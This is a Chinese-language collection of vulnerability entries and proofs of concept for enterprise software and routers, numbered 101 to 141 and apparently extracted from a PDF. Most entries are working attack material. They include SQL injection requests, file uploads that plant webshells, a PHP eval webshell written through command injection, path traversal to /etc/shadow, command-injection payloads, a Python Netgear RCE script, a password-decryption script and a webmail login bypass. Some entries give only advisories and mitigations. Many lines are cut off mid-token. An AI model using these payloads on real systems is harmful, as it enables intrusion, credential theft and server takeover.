漏洞描述：明源地产ERP系统具有丰富的房地产⾏业经验和定制化功能,可以适应不同企业的需求。该
系统存在sql注⼊漏洞，可获取服务器权限
POC:1 relative: req0 && req1
2 session: false
3 requests:
4 - method: GET
5 timeout: 13
6 path: /cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20D
7 headers:
8 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik
9 Gecko) Chrome/89.0.3119.54 Safari/537.36
10 follow_redirects: true
11 matches: (time.gt("5") && time.lt("10"))
12 - method: GET
13 timeout: 10
14 path: /cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20D
15 headers:
16 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik
17 Gecko) Chrome/89.0.3119.54 Safari/537.36
18 follow_redirects: true
19 matches: time.lt("5") 
102. 致远OA_V8.1SP2⽂件上传漏洞
1 POST /seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=
2 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
3 User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64,rident/7.0; ry:11.0)
4 Accept-Encoding: gzip,deflate
5 Cookie:JSESSIONID=5bGx5rW35LmL5YWz
6 Cache-Control: no-cache
7 Content-Encoding: deflate
8 Pragma: no-cache
9 Host: 1.1.1.1
10 Accept: text/html，image/gif, image/jpeg，*; q=.2,*/*; q=.2
11 Content-Length:522729
12 Connection: close
13 X-Forwarded-For: 1.2.3.4
14
15 arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","for
103. 致远 OA 协同管理软件⽆需登录 getshell
1 访问 ： ip/seeyon/htmlofficeservlet 
如果出现下图所⽰的内容，表⽰存在漏洞。
构造 PoC
1 DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV
2 OPTION=S3WYOSWLBSGr
3 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
4 CREATEDATE=wUghPB3szB3Xwg66
5 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
6 originalFileId=wV66
7 originalCreateDate=wUghPB3szB3Xwg66
8 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2
9 dEg6
10 needReadFile=yRWZdAS6
11 originalCreateDate=wLSGP4oEzLKAz4=iz=66
12 webshell
访问 webshell104. LiveBos ShowImage.do ⽂件 imgName 参数读取漏洞
LiveBOS（简称LiveBOS）是顶点软件股份有限公司开发的⼀个对象型业务架构中间件及其集成开发⼯
具。LiveBos ShowImage.do ⽂件 imgName 参数存在⽂件读取漏洞，攻击者可以获取⼤量敏感信
息。
检索语法：
1 Condition: body="LiveBos" || body="/react/browser/loginBackground.png"
POC:
1 relative: req0
2 session: false
3 requests:
4 - method: GET
5 timeout: 10
6 path: /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../..
7 headers:
8 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML
9 like Gecko) Chrome/69.0.1141.87 Safari/537.36
10 follow_redirects: true
11 matches: (code.eq("200") && body.contains("home/livebos") && body.contains("
105. 东⽅通TongWeb多个历史漏洞
漏洞描述 ：东⽅通存在多个历史漏洞，可能会导致信息泄漏、任意代码执⾏等危害
漏洞类型：任意⽂件上传、远程代码执⾏等
影响版本：不明
漏洞状态：均为Nday，POC 未公开，官⽅已发布修复补丁
研判结果：确认存在，等级严重。
修复建议：安装官⽅补丁
下载地址:https://tongtech.com/dft/download.html##;或联系官⽅售后提供产品补丁包及产品升级包
安装咨询、远程技术⽀持或上⻔服务⽀持。 联系⽅式可参考:
https://tongtech.com/dft/newsDetailhtml?id=102195
临时缓解⽅案
1)暂时关闭管理控制台(默认9060端⼝)或设置访问策略，仅允许可信的ip地址访问管理控制
台。如暂时不需要使⽤管理控制台，可在/conf/tongwebxml中关闭管理控制台，将status的值设置为
stopped，<http-listener name="system-http-listener"port="9060"status="stopped">
2)暂时关闭JMX(默认7200端⼝)或设置访问策略，仅允许可信的ip地址访问JMX。若不使⽤
JMX7200端⼝采集Tongweb监控值，可关闭JMX端⼝，/conf/tongweb.xml中可关闭JMX，
enabled 设为 false<imx-service port="7200"address="127.0.0.1"protocol="rmi"enabled="false">
补丁链接：https://tongtech.com/dft/download.html
补丁名称：
TongWeb安全升级补丁包SR-001.part1
TongWeb安全升级补丁包SR-001.part2
TongWeb安全升级补丁包SR-001.part3
TongWeb安全升级补丁包SR-002
TongWeb6&amp;7⽂件上传和下载功能安全升级补丁包
TongWeb应⽤服务器产品控制台安全升级补丁包
TongWeb6&amp;7命令⾏上传⽂件功能升级补丁
TongWeb5命令⾏上传⽂件功能升级补丁
TongWeb应⽤服务器产品控制台安全升级补丁包
安全运营中⼼建议：
1、建议云防开启⾼阻断策略，等修复完逐项放开
2、没上云防的功能重点监控，所有互联⽹扫描直接封堵
106. 蓝凌oa⽂件上传漏洞
1 1. 接⼝上传带⻢的zip包（aaa绕waf）
2 （绕过WAF的内容有500k的⼤⼩，这⾥就不上传了，只写出相关特征）
34 POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true
 HTTP/1.1
5 X-Real-IP: 
6 X-Forwarded-For: 
7 Host: 
8 X-Forwarded-Proto: https
9 X-B3-TraceId: a22c34f91eb9bd9e1326b3cc54aa23e9
10 X-B3-SpanId: a22c34f91eb9bd9e1326b3cc54aa23e9
11 Content-Length: 500817
12 Content-Type: multipart/form-data; boundary=********************1692085217190
13 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) 
AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 
Safari/600.1.4
14 Accept-Encoding: gzip, deflate
15 Cache-Control: no-cache
16 Pragma: no-cache
17 Accept: text/html, image/gif, image/jpeg, 
18
19
20 2. 接⼝传参访问⻢
21 POST /resource/ui-component/themes/logs.jsp HTTP/1.1
22 X-Real-IP: 
23 X-Forwarded-For: 
24 Host: 
25 X-Forwarded-Proto: https
26 X-B3-TraceId: 2b5ccdfac376359b2f4ead71fe65db9d
27 X-B3-SpanId: 2b5ccdfac376359b2f4ead71fe65db9d
28 Content-Length: 42500
29 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101
Firefox/116.0
30 Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,
31 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
32 Accept-Encoding: gzip, deflate
33 Cookie: SESSION=OWM5MjdiYjYtMjJjNy00OTlkLWJjNTktMTE1NDI3ZDhjMTc0; 
SERVERID=357e46e5f6aa75f389927a23b666915b|1692085247|1692083970
34 Upgrade-Insecure-Requests: 1
35 Sec-Fetch-Dest: document 
36 Sec-Fetch-Mode: navigate
37 Sec-Fetch-Site: none
38 Sec-Fetch-User: ?1
39 Content-Type: application/x-www-form-urlencoded
40
41 3. 访问⻢ login.jsp107. ⾦和jc6存在任意⽂件上传漏洞
⾦和OA是⼀款结合了⼈⼯智能技术的数字化办公平台，为企业带来了智能化的办公体验和全⾯的数字
化转型⽀持。因未对接⼝进⾏过滤限制，导致了任意⽂件的上传，可上传⽊⻢从⽽控制服务器
修复建议：
对上传⽂件的⼤⼩和类型进⾏校验，定义上传⽂件类型⽩名单。
检索语法：body="jc6/platform"
1 POC特征如下：
2 /C6/Jhsoft.Web.module/eformaspx/editeprint.aspx?
key=writefile&filename=1.ashx&KeyCode=sxfZyQBw8yQ=&designpath=/C6/&typeid=&sPat
hfceform=./
Poc:
1 relative: req0 && req1
2 session: false
3 get_variables:
4 - payload: base64Decode("SGVsbG8gV29ybGQgICAgIDg3IfileuploadCAgICAgICAgICAgICA
5 requests:
6 - method: POST
7 timeout: 35
8 path: /jc6/OfficeServer
9 headers:
10 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik
11 Gecko) Chrome/87.0.1482.110 Safari/537.36
12 Content-Type: application/x-www-form-urlencoded
13 data: '{{payload}}'
14 follow_redirects: true
15 matches: code.eq("200")
16 - method: GET
17 timeout: 10
18 path: /public/edit/info.jsp
19 headers:
20 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, lik
21 Gecko) Chrome/87.0.1482.110 Safari/537.36
22 follow_redirects: true
23 matches: (code.eq("200") && body.contains("only test"))108. 深信服 SG上⽹优化管理系统 catjs.php 任意⽂件读取漏洞
1 POST /php/catjs.php
2
3 ["../../../../../../etc/shadow"]
109. 明御 SQL注⼊
1 /cqztbweb/VisitorWeb/VisitorWeb_XMLHTTPaspx?ParentCode=1'
110. 时空智友企业流程化管控系统 login ⽂件读取漏洞
漏洞描述：时空智友企业流程化管控系统是使⽤JAVA开发为企业提供流程化管控的⼀款系统。时
空智友企业流程化管控系统存在⽂件读取漏洞，攻击者可以读取⽂件获取敏感信息。
111. 赛思 SuccezBI前台任意⽂件上传
1 POST /succezbi/sz/commons/form/file/uploadChunkFile?
guid=../tomcat/webapps/ROOT/&chunk=ss.jsp HTTP/1.1
2 Host: 10.168.4.99:808
3 Content-Length: 49564
4 Cache-Control: max-age=0
5 Upgrade-Insecure-Requests: 1
6 Origin: null
7 Content-Type: multipart/form-data; boundary=----
WebKitFormBoundary8GeAY18LCxR7XnVP
8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
9 Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima
ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10 Accept-Encoding: gzip, deflate
11 Accept-Language: zh-CN,zh;q=0.9
12 Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2
13 Connection: close14
15 ------WebKitFormBoundary8GeAY18LCxR7XnVP
16 Content-Disposition: form-data; name="file"; filename="ww"
17 Content-Type: image/jpeg
18
19 webshell
20 ------WebKitFormBoundary8GeAY18LCxR7XnVP
21 Content-Disposition: form-data; name="tijiao"
22
23 confirm
24 ------WebKitFormBoundary8GeAY18LCxR7XnVP--
1 webshell：http://xxx/ww_ss.jsp
112. 安恒明御安全⽹关rce
1 GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo+"
<%3fphp+eval(\$_POST[\"a\"]);?>"+>+.xxx.php HTTP/1.1
2 Host: xxx
3 Cookie: USGSESSID=495b895ddd42b82cd89a29f241825081
4 Pragma: no-cache
5 Cache-Control: no-cache
6 Upgrade-Insecure-Requests: 1
7 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16_0) AppleWebKit/537.36 
(KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
8 Sec-Fetch-User: ?1
9 Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*
;q=0.8,application/signed-exchange;v=b3
10 Sec-Fetch-Site: none
11 Sec-Fetch-Mode: navigate
12 Accept-Encoding: gzip, deflate
13 Accept-Language: zh-CN,zh;q=0.9
14 Connection: close
1 shell：http://xxx/webui/.xxx.php
113. ⼤华⻋载系统任意⽂件上传漏洞POC1 POST /vehicleServer/carDev/icon/import/1?iconType=1 HTTP/1.1 Host: ip:port
2 Accept: */*
3 Accept-Encoding: gzip, deflate, br
4 Content-Length: 872
5 Content-Type: multipart/form-data; boundary=----63766573e5ae9ee9aa8ce5aea4
6 User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, 
7 ------63766573e5ae9ee9aa8ce5aea4
8 Content-Disposition: form-data; name="file"; filename="test.jsp" Content-Type: i
9 GIF89a
10 <%jsp ⻢%> ------63766573e5ae9ee9aa8ce5aea4--
11
12 获取路径:
13 GET /vehicleServer/carDev/icon/getIconList?nowTime=164605907220
114. 禅道18.0~18.3 backstage命令注⼊
1 POST /zentaopms/www/index.php?m=zahost&f=create HTTP/1.1
2 Host: 127.0.0.1
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 
Firefox/110.0
4 Accept: application/json, text/javascript, */*; q=0.01
5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6 Accept-Encoding: gzip, deflate
7 Referer: http://127.0.0.1/zentaopms/www/index.php?m=zahost&f=create
8 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9 X-Requested-With: XMLHttpRequest
10 Content-Length: 134
11 Origin: http://127.0.0.1
12 Connection: close
13 Cookie: zentaosid=dhjpu2i3g51l6j5eba85aql27f; lang=zh-cn; device=desktop; 
theme=default; tab=qa; windowWidth=1632; windowHeight=783
14 Sec-Fetch-Dest: empty
15 Sec-Fetch-Mode: cors
16 Sec-Fetch-Site: same-origin
17
18 vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=
2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=za
115. 深信服应⽤交付系统RCE
fid="iaytNA57019/kADk8Nev7g=="
1 POST /rep/login HTTP/1.12 Host: 1.1.1.1:85
3 Cookie: UEDC_LOGIN_POLICY_VALUE=checked
4 Content-Length: 124
5 Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
6 Accept: */*
7 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
8 X-Requested-With: XMLHttpRequest
9 Sec-Ch-Ua-Mobile: ?0
10 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
11 Sec-Ch-Ua-Platform: "Windows"
12 Origin: https://1.1.1.1
13 Sec-Fetch-Site: same-origin
14 Sec-Fetch-Mode: cors
15 Sec-Fetch-Dest: empty
16 Referer: https://1.1.1.1:85/rep/login
17 Accept-Encoding: gzip, deflate
18 Accept-Language: zh-CN,zh;q=0.9
19 Connection: close
20
21 clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account
116. ZKTeco BioTime存在密码重置漏洞(CVE-2023-38949)
poc暂⽆。
117. Stakater Forecastle 存在路径遍历漏洞 (CVE-2023-40297)
poc暂⽆。
118. 锐捷数据库审计系统存在后台 downloadTcpDumpFiles ⽂件读取
漏洞
poc暂⽆。
119. 泛微 E-Moblle 敏感信息泄露
poc暂⽆。
120. 亿赛通电⼦⽂档安全管理系统远程命令执⾏漏洞
1 POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=
2 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like 
3 Accept-Encoding: gzip, deflate
4 Accept: */*
5 Connection: close
6 Host: 
7 Content-Length: 78
8
9 <?xml version="1.0" encoding="UTF-8"?>
10 <RDF>
11 <item/>
12 </RDF>
13 
121. TP-LINKTL-WR940N命令执⾏漏洞（CVE-2023-33538)
The PoC of TL-WR940NV4 is as follows:
1 GET /JFYRUKOAPAQZRKOC/userRpm/WlanNetworkRpm.htm?ssid1=TP-LINK_000012||reboot;&s
2 Host: 127.0.0.1:8081
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 F
4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6 Accept-Encoding: gzip, deflate
7 Connection: keep-alive
8 Referer: http://127.0.0.1:8081/JFYRUKOAPAQZRKOC/userRpm/WlanNetworkRpm.htm
9 Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYz
10 Upgrade-Insecure-Requests: 1
The PoC of TL-WR940NV2 is as follows:1 GET /UJOGPJXBZUFEBUDB/userRpm/WlanNetworkRpm.htm?ssid1=;reboot;&ssid2=TP-LINK_00
2 Host: 192.168.0.1
3 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Fir
4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
5 Accept-Language: en-US,en;q=0.5
6 Accept-Encoding: gzip, deflate
7 Connection: keep-alive
8 Referer: http://192.168.0.1/KMODQNKANSQJBYFA/userRpm/WlanNetworkRpm.htm
9 Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYz
10 Upgrade-Insecure-Requests: 1
The PoC of TL-WR841N V8 is as follows:
1 GET /userRpm/WlanNetworkRpm.htm?ssid1=a;reboot&ssid2=TP-LINK_000000_2&ssid3=TP-L
2 Host: 0.0.0.0:49168
3 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0
5 Accept-Language: en-US,en;q=0.5
6 Accept-Encoding: gzip, deflate
7 Authorization: Basic YWRtaW46YWRtaW4=
8 Connection: close
9 Referer: http://0.0.0.0:49168/userRpm/WlanNetworkRpm.htm
10 Cookie: Authorization=
11 Upgrade-Insecure-Requests: 1
The PoC of TL-WR841N V10 is as follows:
1 GET /GWIDNCGBKQNKXJXB/userRpm/WlanNetworkRpm.htm?ssid1=a;reboot;&ssid2=TP-LINK_0
2 Host: 127.0.0.1:8081
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 F
4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
5 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6 Accept-Encoding: gzip, deflate
7 Connection: keep-alive
8 Referer: http://127.0.0.1:8081/GWIDNCGBKQNKXJXB/userRpm/WlanNetworkRpm.htm
9 Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYz
10 Upgrade-Insecure-Requests: 1
122. Netgear D/R系列路由命令执⾏漏洞（CVE-2023-33533/CVE-2023-
33532)
1 # Exploit Title: Router Netgear-R6250 - RCE
2 # Date: 12-5-2023
3 # Exploit Author: d2y6p
4 # Firmware: R6250V1.0.4.48
5 # CVE: N/A
6
7 #!/usr/bin/python3
8
9 import requests
10 import base64
11 import re
12
13 target = input("Enter Target IP : ")
14 username = input("Enter Target username : ")
15 passwd = input("Enter Target passwd : ")
16 cmd = input("Enter you want cmd : ")
17
18 username_passwd = username + ":" + passwd
19 auth = base64.b64encode(username_passwd.encode('utf-8')).decode("utf-8")
20 print(auth)
21
22 #request 1 : get XSRF_TOKEN
23 burp0_url = "http://" + target + ":80/IPV6_fixed.htm"
24 burp0_cookies = {"XSRF_TOKEN": "2267229739"}
25 burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0
26 response1 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies
27
28 if 'Set-Cookie' in response1.headers:
29 set_cookie = response1.headers['Set-Cookie']
30 print(f'The Set-Cookie value is: {set_cookie}')
31 else:
32 print('No Set-Cookie field in the response header')
33
34 pattern = r'(?<=\=)([^;]*)'
35 XSRF_TOKEN = re.findall(pattern, set_cookie)[0]
36 print(XSRF_TOKEN)
37
38 #request 2 : get csrf_id
39 burp0_cookies = {"XSRF_TOKEN": XSRF_TOKEN}
40 burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0
41 response2 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies42 pattern = r'cgi\?id=([\w\d]+)'
43 csrf_id = re.search(pattern, response2.text).group(1)
44 print("csrf_id is :" + csrf_id)
45
46 #request 3 : send payload
47 burp0_url = "http://" + target + ":80/ipv6_fix.cgi?id=" + csrf_id
48 burp0_data = {"apply": "Apply", "login_type": "Fixed", "IPv6WanAddr1": "2001", "
49 burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0
50
51 response3 = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookie
52
53 print('end!!!')
123. 泛微oa代码执⾏
1 POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
2
3 Content-Type: multipart/form-data; boundary=1
4
5 --1
6 Content-Disposition: form-data; name="Filedata"; filename="a.php"
7 Content-Type: application/octet-stream
8
9 <?php phpinfo();?>
10
11 --1--
12 --1
13 Content-Disposition: form-data; name="file"; filename=""
14 Content-Type: application/octet-stream
15
16 --1--
124. 冰蝎客⼾端RCE与任意⽂件读取漏洞
https://mp.weixin.qq.com/s/vuDgJZnwktM4EEAwfH6UEA
125. 泛微9 sql注⼊
1 (1)/E-mobile/flowdo_page.php?diff=delete&RUN_ID=1 //参数RUN_ID
2 (2)/E-mobile/flowdo_page.php?diff=delete&flowid=1 //参数flowid
3 (3)/E-mobile/flowsorce_page.php?flowid=2
4 (4)/E-mobile/flownext_page.php?diff=candeal&detailid=25 (5)/E-mobile/flowimage_page.php?FLOW_ID=2
6 (6)/E-mobile/flowform_page.php?FLOW_ID=2
7 (7)/E-mobile/diaryother_page.php?searchword=23
8 (8)/E-mobile/create/ajax_do.php?diff=word&sortid=1 //参数sortid
9 (9)/E-mobile/create/ajax_do.php?diff=word&idstr=2 //参数idstr
10 (10)/E-mobile/flow/freeflowimg.php?RUN_ID=1 
11 (11)/E-mobile/create/ajax_do.php?diff=addr&sortid=1 //参数sortid
12 (12)/E-mobile/create/ajax_do.php?diff=addr&userdept=1 //参数userdept
13 (13)/E-mobile/create/ajax_do.php?diff=addr&userpriv=1 //参数userpriv
14 (14)/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1 //参数idstr
15 (15)/E-mobile/flow/flowhave_page.php?detailid=2,3
16 (16)/E-mobile/flow/flowtype_free.php?flowid=1
17 (17)/E-mobile/flow/flowtype_free.php?runid=1
18 (18)/E-mobile/flow/flowtype_other.php?flowid=1
19 (19)/E-mobile/flow/flowtype_other.php?runid=1
20 (20)/E-mobile/flow/freeflowimage_page.php?fromid=2
21 (21)/E-mobile/flow/freeflowimage_page.php?diff=new&runid=2 //参数runid
22
126. Cacti 未授权远程命令执⾏漏洞（0day ）
影响版本： version <= 1.2.24(最新版)， 利⽤条件为启⽤匿名访问、且匿名账⼾具备 Reports
Creation 权限
临时缓解措施：使⽤⽹络 ACL 限制访问来源， 加强监测。 再确认不影响业务的前提下禁⽤匿名⽤⼾访
问。
poc暂⽆。
127. ⽤友 U9 Cloud 远程代码执⾏漏洞
影响版本： version <= 202206（ 最新版）
poc暂⽆。
128. ⾦蝶 Apusic 应⽤中间件代码命令执⾏漏洞
影响版本： V9.0
poc暂⽆。
129. 东⽅通 tongweb 应⽤服务器 未授权远程代码执⾏漏洞
影响版本： version <= 7.0.4.8
临时缓解措施：使⽤⽹络 ACL 限制访问来源， 加强监测。 重点拦截请求路径中包含“
/console/css/+常⻅命令 JSP"的请求;poc暂⽆。
130. Jxstar-Cloud 软件开发平台任意⽂件上传漏洞
影响版本： version <= V2.5.1， 最新版 V3.2.0 暂⽆环境验证， 可能受影响
poc暂⽆。
131. TerraMaster 未授权远程命令执⾏漏洞
影响版本： version <= 4.2.41， 最新版暂⽆环境验证， 可能受影响
poc暂⽆。
132. 迈普 MPSec MSG4000 安全⽹关 远程命令执⾏漏洞
影响版本： version <= 4.6.2.2
临时缓解措施：该漏洞最新版本已经修复（ 当前已安装版本可通过/.version 查看） 。 如⽆法升级⾄
安全版本， 可使⽤使⽤⽹络 ACL 限制访问来源， 加强监测。
poc暂⽆。133. ⻜企互联 FE 企业运营管理平台远程代码执⾏漏洞
影响版本： version <= 6.6.0
临时缓解措施：该漏洞最新版本 v7.0 已经修复（ 当前已安装版本可通过【登录⻚-关于】 查看） 。 如
⽆法升级⾄安全版本， 可使⽤使⽤⽹络 ACL 限制访问来源， 加强监测。
poc暂⽆。
该漏洞最新版本已经修复。134. ⾦蝶 EAS 系统存在⽬录遍历漏洞
漏洞描述
⾦蝶EAS Cloud基于云计算技术，为⼤型集团企业提供⼀体化、智能化的业务解决⽅案。 在EAS发现了
⼀处⽬录遍历漏洞，可以直接遍历指定⽬录的内容。 经过分析与研判，该漏洞利⽤难度低，能够获取
敏感信息，建议尽快修复。
详情信息：
/appmonitor/protected/selector/server_file/files?folder=C:%5C%5C&suffix=
135. H3C多系列路由器存在前台RCE漏洞
h3c多个系列路由器存在安全漏洞
fofa：app="H3C-Ent-Router"
POC参考如下：
1 POST /goform/aspForm HTTP/1.1
2 Host: {{Hostname}}
3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
4 Connection: close
5 Content-Length: 68
6 Accept-Encoding: gzip, deflate
7 Content-Type: application/x-www-form-urlencoded
8 Referer: http://{{Hostname}}/userLogin.asp
9
10 CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
11 访问http://xxx/test136. xxl-rpc远程命令执⾏漏洞
影响产品 version<=1.7.0（最新版） 利⽤状态 在野利⽤（已公开poc） 漏洞详情 xxl-rpc是⼀个分布式
服务框架，提供稳定⾼性能的RPC远程服务调⽤功能开源软件。 当攻击者能够访问xxl-rpc框架的服务
⽅7080端⼝时，利⽤该漏洞可在⽆需认证的情况下执⾏任意命令，从⽽导致服务器被⼊侵控制。 处置
建议： ⽬前官⽅未发布修复版本，建议通过⽩名单等⽅式临时限制xxl-rpc服务端⼝(默认「7080」)的
访问权限，并且如⽆必要关闭对公⽹开放。
137. 帆软报表 V8 get_geo_json 任意⽂件读取漏洞
1 WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
2 获得账号密码后进⾏解密，解密脚本如下
3 解密脚本
4 cipher = 'XXXXXXXXXXX' #密⽂
5 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]
6 Password = ""
7 cipher = cipher[3:]
8 for i in range(int(len(cipher) / 4)):
9 c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
10 c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
11 Password = Password + chr(c2)
12 print (Password)
138. WEBMAIL任意⽤⼾登录漏洞
1 /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin
2 回显是下⾯这个
3 "errorMsg":"64d880ce7b737912ccb1"
4 使⽤回显的 errormsg 作为密码，⽤⼾名为 admin 即可登录
5 使⽤⼿机验证码登录的打不了
6 显⽰ IP 受限的话添加头 X-Forwarded-For: 127.0.0.1 即可
7 如果有回显但登录失败的话，使⽤
8 /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin@+证书 or 根域名获取
139. 联想⽹盘任意⽂件上传漏洞
1 POST /write?neid=1&hash=../../../../../../../dragonball/srv/tomcat/webapps/strea
2 Host:xxxx
3 Cache-Control:max-age=04 Sec-Ch-Ua:"Chromium";v="117", "Not;A=Brand";v="8"
5 Sec-Ch-Ua-Mobile:?0
6 Sec-Ch-Ua-Platform:"Windows"
7 Upgrade-Insecure-Requests:1
8 User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, 
9 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
10 Sec-Fetch-Site:none
11 Sec-Fetch-Mode:navigate
12 Sec-Fetch-User:?1
13 Sec-Fetch-Dest:document
14 Accept-Language:zh-CN,zh;q=0.9
15 Connection:close
16 Content-Type:application/octet-stream
17 Accept-Encoding:gzip, deflate
18 Content-Length:8
19
20 abcd
140. 明源云ERP⼯作流组件远程代码执⾏漏洞
漏洞编号 ⽆ 影响产品 最新版 利⽤状态 在野利⽤（已公开poc） 漏洞详情 明源云 ERP 的⼯作流组件
中， WFWebService.asmx 存在 WriteLog ⽅法没有任何过滤，直接使⽤ BinaryFormatter 反序列化，
因此可以⽤Ysoserial.Net 来⽣成反序列化 payload，再通过 Soap 调⽤远程⽅法来触发反序列化，实
现任意代码执⾏，从⽽导致服务器被接管。
141. ⻘藤云EDR权限提升漏洞，可提权到system权限
漏洞编号 ⽆ 影响产品 最新版 利⽤状态 在野利⽤（已公开poc） 漏洞详情 ⻘藤云 EDR 存在权限提升漏
洞，可提权到 system 权限。在 windows 下⻘藤在获取资产信息的时候，如何发现进程树中有
python 进程，它会尝试获取 python 版本， 获取的⽅法:
1. 枚举进程找到进程名字"python.exe"的进程, 获取⽂件路径。
2. 然后直接启动进程 [获取 python.exe 的路径] -V 获取输出。 ⻘藤客⼾端本⾝是 System 权限，在启
动进程时候没有进⾏降权处理,导致提权 漏洞。 ⻘藤会定时的更新资产信息，所以此漏洞可以⽆需
⼲预⾃动提权
1 ⻘藤的测试 POC
2 local function save_python_info(ctx, info_table)
3 local proc_names = {"python.exe"}
4 local procs_ret = ctx.get_proc_list_info_rely(ctx, proc_names)
5 if next(procs_ret) == nil then
6 return
7 end
8 -- call get version9 -- ... 省略⽆关代码
10 get_python_ver(proc)
11 -- ... 省略⽆关代码
12 end
13
14 function get_python_ver(proc)
15 if proc == nil then
16 return ""
17 end
18 if file_api.file_exists(proc.path) then
19 local cmdline = "\\"" .. proc.path .. "\\" -V"
20 local ret, output = common.execute_shell(cmdline)
21 if ret == 0 and output and output ~= "" then
22 return regex.match(output, "\\\\d.+\\\\d")
23 else
